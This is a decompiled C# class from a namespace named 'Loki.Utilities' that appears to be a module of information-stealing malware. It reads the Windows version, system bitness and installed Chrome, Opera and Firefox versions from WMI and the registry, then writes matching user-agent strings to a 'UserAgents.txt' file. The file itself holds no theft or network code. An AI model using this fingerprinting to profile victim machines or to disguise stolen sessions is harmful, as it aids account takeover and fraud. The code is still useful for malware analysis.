using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Loki.Utilities;

internal class UserAgent
{
	public static string razr;

	public static string NT { get; set; }

	private static ManagementObject _003CGetNTVersion_003Eg__GetMngObj_007C7_0(string className)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		ManagementClass val = new ManagementClass(className);
		ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current = enumerator.get_Current();
				ManagementObject val2 = (ManagementObject)current;
				if (val2 != null)
				{
					return val2;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return null;
	}

	private static string _003CGetNTVersion_003Eg__GetOsVer_007C7_1()
	{
		try
		{
			ManagementObject val = _003CGetNTVersion_003Eg__GetMngObj_007C7_0("Win32_OperatingSystem");
			if (val == null)
			{
				return string.Empty;
			}
			return ((ManagementBaseObject)val).get_Item("Version") as string;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static string GetNTVersion()
	{
		try
		{
			return _003CGetNTVersion_003Eg__GetOsVer_007C7_1();
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static void get_agent(string dir)
	{
		GetOSBit();
		NT = GetNTVersion();
		string empty = string.Empty;
		string[] array = NT.Split(new char[1] { '.' });
		string text = string.Empty;
		if (array.Contains("10"))
		{
			text = "Windows NT 10.0";
		}
		if (array.Length > 1 && !array.Contains("10"))
		{
			text = "Windows NT " + array[0] + "." + array[1];
		}
		try
		{
			using StreamWriter streamWriter = new StreamWriter(dir + "\\UserAgents.txt");
			if (Directory.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data"))
			{
				object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
				if (value != null)
				{
					empty = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
				}
				else
				{
					value = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
					empty = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
				}
				if (razr == "x64")
				{
					streamWriter.WriteLine("Mozilla/5.0 (" + text + "; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + empty + " Safari/537.36");
				}
				else
				{
					streamWriter.WriteLine("Mozilla/5.0 (" + text + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + empty + " Safari/537.36");
				}
			}
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Web Data"))
			{
				try
				{
					string text2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Classes\\Applications\\opera.exe\\shell\\open\\command", "", null)!.ToString();
					text2 = text2.Remove(text2.Length - 6, 6);
					text2 = text2.Remove(0, 1);
					empty = FileVersionInfo.GetVersionInfo(text2).FileVersion;
					string text3 = string.Empty;
					if (empty.Split(new char[1] { '.' }).First().Equals("54"))
					{
						text3 = "67.0.3396.87";
					}
					if (empty.Split(new char[1] { '.' }).First().Equals("55"))
					{
						text3 = "68.0.3440.106";
					}
					if (empty.Split(new char[1] { '.' }).First().Equals("56"))
					{
						text3 = "69.0.3497.100";
					}
					if (empty.Split(new char[1] { '.' }).First().Equals("57"))
					{
						text3 = "70.0.3538.102";
					}
					if (razr == "x64")
					{
						streamWriter.WriteLine("Mozilla/5.0 (" + text + "; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + text3 + " Safari/537.36 OPR/55.0.2994.44");
					}
					else
					{
						streamWriter.WriteLine("Mozilla/5.0 (" + text + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + text3 + " Safari/537.36 OPR/55.0.2994.44");
					}
				}
				catch (Exception)
				{
				}
			}
			if (File.Exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe"))
			{
				object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
				if (value2 != null)
				{
					empty = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
				}
				else
				{
					value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
					empty = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
				}
				string empty2 = string.Empty;
				empty2 = empty.Split(new char[1] { '.' }).First() + "." + empty.Split(new char[1] { '.' })[1];
				if (razr == "x64")
				{
					streamWriter.WriteLine("Mozilla/5.0 (" + text + "; Win64; x64; rv:" + empty2 + ") Gecko/20100101 Firefox/" + empty2);
				}
				else
				{
					streamWriter.WriteLine("Mozilla/5.0 (" + text + "; rv:" + empty2 + ") Gecko/20100101 Firefox/" + empty2);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static string GetOSBit()
	{
		if (Is64Bit())
		{
			razr = "x64";
			return "x64";
		}
		razr = "x32";
		return "x32";
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);

	public static bool Is64Bit()
	{
		IsWow64Process(Process.GetCurrentProcess().Handle, out var lpSystemInfo);
		return lpSystemInfo;
	}
}
